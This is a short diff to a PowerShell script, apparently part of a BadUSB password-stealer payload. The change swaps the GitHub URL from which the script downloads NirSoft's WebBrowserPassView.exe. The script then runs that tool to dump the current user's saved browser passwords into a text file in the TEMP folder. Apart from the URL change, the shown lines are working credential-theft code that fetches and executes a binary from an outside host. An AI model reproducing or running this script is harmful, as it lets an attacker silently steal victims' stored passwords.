@@ -1,6 +1,6 @@
 Set-Location C:\Users\Public\Documents
 
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
+Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 
 .\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
 
